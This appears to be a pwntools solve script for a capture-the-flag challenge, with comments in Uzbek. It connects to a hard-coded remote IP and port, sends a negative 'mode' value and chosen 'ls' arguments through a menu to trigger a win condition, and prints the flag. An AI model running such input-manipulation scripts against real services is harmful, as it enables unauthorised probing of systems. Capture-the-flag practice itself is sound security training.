from pwn import *

# Server ma'lumotlari
host = '154.57.164.68'
port = 31363

def solve():
    try:
        # Serverga ulanamiz
        r = remote(host, port)
        
        # 1. Mode o'rnatish: -1
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'(mode)> ', b'-1')
        
        # 2. Bin o'rnatish: ls
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'(bin)> ', b'ls')
        
        # 3. Argumentlarni yuborish
        # Maqsad: returncode 1 va 2 ni olish
        # Masalan: 'ls .' (rc=0 yoki 1) va 'ls /not' (rc=2)
        r.sendlineafter(b'> ', b'3')
        r.sendlineafter(b'(arg1,arg2)> ', b'.,/not')
        
        # 4. Switchlarni yuborish
        r.sendlineafter(b'> ', b'4')
        r.sendlineafter(b'(switch1,switch2)> ', b'.,.')
        
        # 5. Beat the competitor!
        r.sendlineafter(b'> ', b'5')
        
        # Flagni o'qiymiz
        print(r.recvall().decode())
        
    except Exception as e:
        print(f"Xatolik yuz berdi: {e}")

if __name__ == "__main__":
    solve()
